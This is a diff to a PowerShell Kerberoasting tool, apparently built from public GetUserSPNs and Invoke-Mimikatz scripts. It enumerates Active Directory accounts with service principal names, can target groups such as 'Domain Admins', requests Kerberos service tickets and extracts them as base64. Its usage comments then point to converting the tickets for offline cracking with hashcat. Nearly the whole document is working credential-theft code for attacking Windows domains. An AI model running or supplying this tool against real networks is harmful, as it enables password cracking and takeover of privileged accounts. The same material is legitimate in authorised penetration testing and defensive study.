@@ -1,18 +1,22 @@
 # Note: This is a copy of https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1 and https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1
-#       with changes to automate the process of requesting service tickets of interest in windows environemnts.  Only minimal testing has been performed
+#       Changes have been made to automate the process of requesting service tickets of interest in windows environemnts.  Only minimal testing has been performed
 
 
 # Instructions:
 # To list ALL user-based SPNs, run:
 #   GetUserSPNs
-# To see what domain and groups those users are apart of, run:
-#   GetUserSPNs | Select Name,UserPrincipalName, MemberOf | ft -autosize -wrap 
 # To list user SPNs that involve users in a particular group, run:
-#   GetUserSPNs -GroupName "Domain Admins" | Select Name,UserPrincipalName, MemberOf | ft -autosize -wrap 
-# When ready to obtain tickets for users in a group of interest, run:
-#   Invoke-AutoKerberoast -GroupName "Domain Admins"
-# To obtain ALL tickets for user SPNs, run:
+#   GetUserSPNs -Group "Domain Admins"
+# To list user SPNs that from a particular domain, run:
+#   GetUserSPNs -Domain "dev.testlab.local"
+# When ready to obtain tickets for users in a group/domain of interest, run:
+#   Invoke-AutoKerberoast -Group "Domain Admins" -Domain "dev.testlab.local"
+# If you don't specify a Group/Domain, then it will return tickets for ALL UNQIUE users assoicated with a SPN.  For example, if two MSSQL SPNs are registered to the same user, it will only request a ticket for the first service
+# To obtain ALL tickets for unique user SPNs in the forest, simply run:
 #   Invoke-AutoKerberoast
+
+# Once desired tickets are obtained, convert into hashcat-compatible format by pasting output into text file and running
+#   python autoKirbi2hashcat.py ./<TICKETS.txt>
 
 
 
@@ -30,37 +34,45 @@
 
 function GetUserSPNS
 {
-
   [CmdletBinding()]
   Param(
-	[Parameter(Mandatory=$False,Position=1)] [string]$GCName,
-	[Parameter(Mandatory=$False)] [string]$Filter,
-    [Parameter(Mandatory=$False)] [string]$GroupName,
-	[Parameter(Mandatory=$False)] [switch]$Request
+  	[Parameter(Mandatory=$False,Position=1)] 
+    [string]$Domain = "",
+
+    [Parameter(Mandatory=$False)]
+    [string]$Group = "",
+
+    [Parameter(Mandatory=$False)]
+    [switch]$ViewAll,
+  	
+    [Parameter(Mandatory=$False)]
+    [switch]$Request
   )
 
   Add-Type -AssemblyName System.IdentityModel
 
   $GCs = @()
 
-  If ($GCName) {
-	$GCs += $GCName
-  } else { # find them
-	$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
-	$CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
+  If ( $Domain ) 
+  {
+    $GCs += $Domain
+  }
+  else # find them
+  { 
+  	$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+  	$CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
 
     $ForestInfo.ApplicationPartitions | % { $GCs += $_.SecurityReferenceDomain }
-
-	#ForEach ($GC in $CurrentGCs) {
-	#  #$GCs += $GC.Name
-	#  $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
-	#}
   }
 
-  if (-not $GCs) {
-	# no Global Catalogs Found
-	Write-Host "No Global Catalogs Found!"
-	Exit
+  # Remove any duplicate Global Catalogs Entries from Array
+  $GCs = $GCs | Select -uniq
+
+  if ( -not $GCs ) 
+  {
+  	# no Global Catalogs Found
+  	Write-Host "No Global Catalogs Found!"
+  	Exit
   }
 
   <#
@@ -102,63 +114,62 @@ function GetUserSPNS
   usncreated                     {57551}
   #>
 
-  ForEach ($GC in $GCs) {
-	$searcher = New-Object System.DirectoryServices.DirectorySearcher
-	$searcher.SearchRoot = "LDAP://" + $GC
-	$searcher.PageSize = 1000
-	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
-	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
-	$searcher.PropertiesToLoad.Add("name") | Out-Null
-	$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
-	#$searcher.PropertiesToLoad.Add("displayname") | Out-Null
-	$searcher.PropertiesToLoad.Add("memberof") | Out-Null
-	#$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
-	#$searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
+  $uniqueAccounts = New-Object System.Collections.ArrayList
 
-	$searcher.SearchScope = "Subtree"
+  ForEach ( $GC in $GCs ) 
+  {
+  	$searcher = New-Object System.DirectoryServices.DirectorySearcher
+  	$searcher.SearchRoot = "LDAP://" + $GC
+  	$searcher.PageSize = 1000
+  	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
+  	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
+  	$searcher.PropertiesToLoad.Add("name") | Out-Null
+  	$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
+    $searcher.PropertiesToLoad.Add("memberof") | Out-Null
+    $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
+  	#$searcher.PropertiesToLoad.Add("displayname") | Out-Null
+  	#$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
 
-	$results = $searcher.FindAll()
-
-		
-	foreach ($result in $results) {
-	  foreach ($spn in $result.Properties["serviceprincipalname"]) {
+  	$searcher.SearchScope = "Subtree"
+  	$results = $searcher.FindAll()
+    
+  	foreach ( $result in $results ) 
+    {
+  	  foreach ( $spn in $result.Properties["serviceprincipalname"] ) 
+      {
         $groups = $result.properties.memberof
+        $distingName = $result.Properties["distinguishedname"][0].ToString()
 
-        if ($GroupName)
-        {
-            if ( $Groups -like "*$GroupName*")
-            {
-                Select-Object -InputObject $result -Property `
-                @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
-                @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
-                @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
-                #@{Name="DisplayName";          Expression={$result.Properties["displayname"][0].ToString()} }, `
-                @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} } #, `
-                #@{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } , `
-                #@{Name="DistinguishedName";    Expression={$result.Properties["distinguishedname"][0].ToString()} }
-
-                if ($Request) {
-                    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
-                }
-            }
+        if ( $viewAll -eq $False )
+        {          
+          if ( $uniqueAccounts.contains($distingName) )
+          {
+            continue
+          }
+          else
+          {
+            [void]$uniqueAccounts.add($distingName)
+          }
         }
-        else
-        {
-            Select-Object -InputObject $result -Property `
-            @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
-            @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
-            @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
-            #@{Name="DisplayName";          Expression={$result.Properties["displayname"][0].ToString()} }, `
-            @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} } #, `
-            #@{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } , `
-            #@{Name="DistinguishedName";    Expression={$result.Properties["distinguishedname"][0].ToString()} }
 
-            if ($Request) {
-                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
-            }	
-		}
-	  }
-	}
+        if ( $Groups -like "*$Group*" )
+        {
+          Select-Object -InputObject $result -Property `
+          @{Name="SPN"; Expression={$spn.ToString()} }, `
+          @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
+          @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
+          @{Name="DistinguishedName";    Expression={$distingName} }, `
+          @{Name="MemberOf";             Expression={$groups} } #, 
+          #@{Name="DisplayName";          Expression={$result.Properties["displayname"][0].ToString()} }, `            
+          #@{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }
+          
+          if ( $Request )
+          {
+            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | out-null
+          }
+        }
+  	  }
+  	}
   }
 }
 
@@ -166,36 +177,34 @@ function Invoke-AutoKerberoast
 {
     [CmdletBinding()]
     Param(
-        [Parameter(Mandatory=$False)] [string]$GroupName
+        [Parameter(Mandatory=$False)] 
+        [string]$Group="",
+
+        [Parameter(Mandatory=$False)]
+        [string]$Domain=""
     )
 
-    if ( $GroupName )
-    {
-        $SPNs = GetUserSPNS -Request -GroupName $GroupName | Select -Unique ServicePrincipalName
-    }
-    else
-    {
-        $SPNs = GetUserSPNS -Request | Select -Unique ServicePrincipalName
-    }
+    $SPNs = GetUserSPNS -Request -Group $Group -Domain $Domain | Select SPN, DistinguishedName
 
     if ( ! $SPNs )
     {
         write-output "Unable to obtain any user account SPNs"
         exit
     }
-    
-
-    #Write-Output $SPNs
 
     $SPNsArray = New-Object System.Collections.ArrayList
-    $SPNs | % { [void]$SPNsArray.Add($_.ServicePrincipalName) }
+    $DnameArray = New-Object System.Collections.ArrayList
 
-    if ($SPNsArray.IndexOf("kadmin/changepw") -ge 0)
+    $SPNs | % { [void]$SPNsArray.Add($_.SPN) }
+    $SPNs | % { [void]$DnameArray.Add($_.DistinguishedName) }
+
+    while ( $SPNsArray.contains("kadmin/changepw") )
     {
+        $DnameArray.RemoveAt($SPNsArray.IndexOf("kadmin/changepw"))
         $SPNsArray.Remove("kadmin/changepw")
     }
 
-    if ($SPNsArray.Count -eq 0)
+    if ( $SPNsArray.Count -eq 0 )
     {
         Write-Output "Unable to Identify any SPNs that use User accounts in this domain."
         exit
@@ -217,9 +226,8 @@ function Invoke-AutoKerberoast
         exit
     } 
 
-    #Write-Output $MimiOutput
-
-    ForEach ($currentSPN in $SPNsArray)
+    $i = 0
+    ForEach ( $currentSPN in $SPNsArray )
     {
         $ticketStartIndex = $kerbTickets.IndexOf($currentSPN)
         $ticket = $kerbTickets.SubString($ticketStartIndex)
@@ -233,8 +241,11 @@ function Invoke-AutoKerberoast
         $ticketEndIndex = $ticket.IndexOf("====================")   
         $ticket = $ticket.SubString(0, $ticketEndIndex)   # Grab everything up until the final break
 
-        Write-Output "`nBase64 encoded Kerberos ticket for $currentSPN`:"
+        $currentUser = $DnameArray[$i]
+        Write-Output "`nBase64 encoded Kerberos ticket for `nDISTINGUISHED NAME: $currentUser `nSPN: $currentSPN` :::"
         Write-Output $ticket
+
+        $i += 1
     }  
 }
 
